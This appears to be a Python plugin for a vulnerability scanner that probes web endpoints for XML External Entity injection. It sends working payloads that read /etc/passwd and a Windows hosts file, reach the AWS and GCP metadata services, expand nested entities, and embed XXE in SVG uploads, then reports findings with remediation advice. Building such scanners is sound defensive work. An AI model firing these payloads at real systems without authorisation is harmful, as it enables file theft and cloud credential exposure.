"""XML External Entity (XXE) injection scanner plugin.

Tests endpoints that accept XML input for XXE vulnerabilities by injecting
entity declarations that attempt file disclosure and SSRF.
Also checks for SVG-based XXE and entity expansion attacks.
"""

import logging
from urllib.parse import urlparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target

logger = logging.getLogger("nightowl")

# XXE payloads for different attack vectors
XXE_PAYLOADS: list[tuple[str, str, list[str], str]] = [
    # (payload_xml, description, success_indicators, attack_type)
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root><data>&xxe;</data></root>',
        "Classic file disclosure (Linux /etc/passwd)",
        ["root:x:0:0", "root:*:0:0", "daemon:", "/bin/bash", "/bin/sh"],
        "file_disclosure",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>'
        '<root><data>&xxe;</data></root>',
        "Classic file disclosure (Windows hosts file)",
        ["localhost", "127.0.0.1", "::1"],
        "file_disclosure",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<root><data>&xxe;</data></root>',
        "File disclosure (/etc/hostname)",
        [],  # any non-error response with content may indicate success
        "file_disclosure",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        '<root><data>&xxe;</data></root>',
        "SSRF via XXE to AWS metadata service",
        ["ami-id", "instance-id", "local-hostname", "security-credentials"],
        "ssrf",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/computeMetadata/v1/">]>'
        '<root><data>&xxe;</data></root>',
        "SSRF via XXE to GCP metadata service",
        ["computeMetadata", "instance/"],
        "ssrf",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo ['
        '<!ENTITY % dtd SYSTEM "http://127.0.0.1:9999/nightowl-xxe-test">'
        '%dtd;]>'
        '<root><data>test</data></root>',
        "Parameter entity XXE (blind/OOB probe)",
        [],
        "blind_xxe",
    ),
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe "NightOwlXXETest123">]>'
        '<root><data>&xxe;</data></root>',
        "Internal entity expansion (XXE capability test)",
        ["NightOwlXXETest123"],
        "entity_expansion",
    ),
]

# Entity expansion / billion laughs (DoS detection, using small version)
BILLION_LAUGHS_SMALL = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE lolz ['
    '<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">'
    ']>'
    '<root><data>&lol3;</data></root>'
)

# SVG-based XXE
SVG_XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg">'
    '<text x="0" y="20">&xxe;</text></svg>'
)

# Common XML-accepting paths
XML_PATHS = [
    "/api/xml",
    "/api/import",
    "/api/upload",
    "/api/parse",
    "/soap",
    "/wsdl",
    "/xmlrpc.php",
    "/xml",
    "/rss",
    "/feed",
    "/sitemap.xml",
    "/api/v1/xml",
]

# Content types that indicate XML processing
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "application/rss+xml",
    "application/atom+xml",
]


class XXEPlugin(ScannerPlugin):
    name = "xxe-scanner"
    description = "Test for XML External Entity injection vulnerabilities"
    version = "1.0.0"
    stage = "scan"

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings: list[Finding] = []
        url = target.url or f"https://{target.host}"
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        try:
            async with httpx.AsyncClient(
                verify=False, follow_redirects=True, timeout=15
            ) as client:
                # ── Phase 1: Discover XML-accepting endpoints ──
                xml_endpoints = await self._discover_xml_endpoints(
                    client, base_url, url
                )

                # Always test the main URL as well
                if url not in xml_endpoints:
                    xml_endpoints.insert(0, url)

                # ── Phase 2: Test each endpoint with XXE payloads ──
                for endpoint in xml_endpoints:
                    for payload, description, indicators, attack_type in XXE_PAYLOADS:
                        try:
                            resp = await self._send_xml(client, endpoint, payload)
                            if resp is None:
                                continue

                            finding = self._analyze_response(
                                resp, payload, description, indicators,
                                attack_type, endpoint
                            )
                            if finding:
                                findings.append(finding)
                                break  # one finding per endpoint is enough

                        except Exception:
                            continue

                    # ── Phase 3: Test entity expansion (DoS) ──
                    try:
                        resp = await self._send_xml(
                            client, endpoint, BILLION_LAUGHS_SMALL
                        )
                        if resp and "lol" in resp.text.lower():
                            expected_count = resp.text.lower().count("lol")
                            if expected_count >= 25:
                                findings.append(
                                    Finding(
                                        title=f"XML Entity Expansion (Billion Laughs) at {endpoint}",
                                        severity=Severity.MEDIUM,
                                        cvss_score=5.3,
                                        description=(
                                            "The XML parser expands recursive entities, "
                                            "which can lead to denial-of-service attacks."
                                        ),
                                        evidence=(
                                            f"Endpoint: {endpoint}\n"
                                            f"Entity expansion count: {expected_count}\n"
                                            f"Response length: {len(resp.text)}"
                                        ),
                                        remediation=(
                                            "Disable DTD processing or limit entity expansion. "
                                            "Set entity expansion limits in the XML parser."
                                        ),
                                        category="xxe",
                                    )
                                )
                    except Exception:
                        pass

                # ── Phase 4: Test SVG upload XXE ──
                svg_findings = await self._test_svg_xxe(client, base_url)
                findings.extend(svg_findings)

        except Exception as e:
            logger.warning(f"XXE scan failed: {e}")

        return findings

    async def _discover_xml_endpoints(
        self, client: httpx.AsyncClient, base_url: str, target_url: str
    ) -> list[str]:
        """Discover endpoints that accept XML content."""
        found: list[str] = []

        for path in XML_PATHS:
            endpoint = f"{base_url}{path}"
            try:
                # Send a minimal XML request
                resp = await client.post(
                    endpoint,
                    content='<?xml version="1.0"?><root/>',
                    headers={"Content-Type": "application/xml"},
                )
                # Check if the server processed XML (non-405, non-404)
                if resp.status_code not in (404, 405, 301, 302):
                    found.append(endpoint)
                    continue

                # Also check if GET returns XML content type
                resp = await client.get(endpoint)
                ct = resp.headers.get("content-type", "").lower()
                if any(xml_ct in ct for xml_ct in XML_CONTENT_TYPES):
                    found.append(endpoint)

            except Exception:
                continue

        # Check if the target URL itself accepts XML
        try:
            resp = await client.post(
                target_url,
                content='<?xml version="1.0"?><root/>',
                headers={"Content-Type": "application/xml"},
            )
            if resp.status_code not in (404, 405) and target_url not in found:
                found.append(target_url)
        except Exception:
            pass

        return found

    async def _send_xml(
        self, client: httpx.AsyncClient, endpoint: str, xml_payload: str
    ) -> httpx.Response | None:
        """Send XML payload to an endpoint with multiple content types."""
        for content_type in ["application/xml", "text/xml"]:
            try:
                resp = await client.post(
                    endpoint,
                    content=xml_payload,
                    headers={"Content-Type": content_type},
                )
                if resp.status_code != 405:
                    return resp
            except Exception:
                continue
        return None

    def _analyze_response(
        self,
        resp: httpx.Response,
        payload: str,
        description: str,
        indicators: list[str],
        attack_type: str,
        endpoint: str,
    ) -> Finding | None:
        """Analyze response for signs of XXE success."""
        body = resp.text
        body_lower = body.lower()

        # Check for specific indicators
        for indicator in indicators:
            if indicator.lower() in body_lower:
                if attack_type == "file_disclosure":
                    return Finding(
                        title=f"XXE File Disclosure at {endpoint}",
                        severity=Severity.CRITICAL,
                        cvss_score=9.1,
                        description=(
                            f"XML External Entity injection allows reading arbitrary files. "
                            f"Attack: {description}. "
                            "An attacker can read sensitive files from the server."
                        ),
                        evidence=(
                            f"Endpoint: {endpoint}\n"
                            f"Attack: {description}\n"
                            f"Indicator found: {indicator}\n"
                            f"Response (truncated): {body[:300]}"
                        ),
                        remediation=(
                            "Disable external entities in the XML parser. "
                            "Disable DTD processing entirely. Use defusedxml (Python) "
                            "or equivalent secure XML parsers."
                        ),
                        category="xxe",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ],
                        metadata={"attack_type": attack_type},
                    )
                elif attack_type == "ssrf":
                    return Finding(
                        title=f"XXE SSRF at {endpoint}",
                        severity=Severity.HIGH,
                        cvss_score=8.6,
                        description=(
                            f"XML External Entity injection allows SSRF. "
                            f"Attack: {description}. "
                            "An attacker can access internal services and cloud metadata."
                        ),
                        evidence=(
                            f"Endpoint: {endpoint}\n"
                            f"Attack: {description}\n"
                            f"Indicator: {indicator}\n"
                            f"Response (truncated): {body[:300]}"
                        ),
                        remediation=(
                            "Disable external entities and DTD processing in the XML parser."
                        ),
                        category="xxe",
                        references=[
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                        ],
                        metadata={"attack_type": attack_type},
                    )
                elif attack_type == "entity_expansion":
                    return Finding(
                        title=f"XXE Entity Processing Enabled at {endpoint}",
                        severity=Severity.MEDIUM,
                        cvss_score=5.3,
                        description=(
                            "The XML parser processes entity declarations. "
                            "While internal entities alone may not be exploitable, "
                            "this indicates the parser may also process external entities."
                        ),
                        evidence=(
                            f"Endpoint: {endpoint}\n"
                            f"Test: Internal entity expansion\n"
                            f"Indicator: {indicator} found in response"
                        ),
                        remediation="Disable DTD processing in the XML parser.",
                        category="xxe",
                    )

        # Check for error messages that reveal XXE processing
        xxe_errors = [
            "failed to load external entity",
            "entity 'xxe'",
            "external entity",
            "dtd not allowed",
            "entityref:",
            "parser error",
        ]
        for err in xxe_errors:
            if err in body_lower:
                return Finding(
                    title=f"XXE Error Disclosure at {endpoint}",
                    severity=Severity.MEDIUM,
                    cvss_score=4.3,
                    description=(
                        "The XML parser reveals error messages about entity processing. "
                        "This confirms the parser attempts to process entities and may be "
                        "exploitable with different payloads."
                    ),
                    evidence=(
                        f"Endpoint: {endpoint}\n"
                        f"Error pattern: {err}\n"
                        f"Response (truncated): {body[:300]}"
                    ),
                    remediation="Disable DTD and external entity processing. Suppress error details.",
                    category="xxe",
                )

        return None

    async def _test_svg_xxe(
        self, client: httpx.AsyncClient, base_url: str
    ) -> list[Finding]:
        """Test SVG upload endpoints for XXE."""
        findings: list[Finding] = []
        upload_paths = ["/upload", "/api/upload", "/api/images", "/api/avatar", "/api/files"]

        for path in upload_paths:
            endpoint = f"{base_url}{path}"
            try:
                # Upload SVG with XXE payload
                resp = await client.post(
                    endpoint,
                    files={"file": ("test.svg", SVG_XXE_PAYLOAD, "image/svg+xml")},
                )
                body_lower = resp.text.lower()

                # Check for passwd file content in response
                if any(ind in body_lower for ind in ["root:x:0:0", "root:*:0:0", "daemon:"]):
                    findings.append(
                        Finding(
                            title=f"SVG Upload XXE at {endpoint}",
                            severity=Severity.CRITICAL,
                            cvss_score=9.1,
                            description=(
                                "SVG file upload endpoint processes XML entities, "
                                "allowing file disclosure through SVG-based XXE."
                            ),
                            evidence=(
                                f"Endpoint: {endpoint}\n"
                                f"Method: SVG file upload\n"
                                f"Response (truncated): {resp.text[:300]}"
                            ),
                            remediation=(
                                "Sanitize SVG uploads by stripping DOCTYPE and entity declarations. "
                                "Use a secure SVG sanitizer library. Disable XML entity processing "
                                "for uploaded files."
                            ),
                            category="xxe",
                        )
                    )
            except Exception:
                continue

        return findings
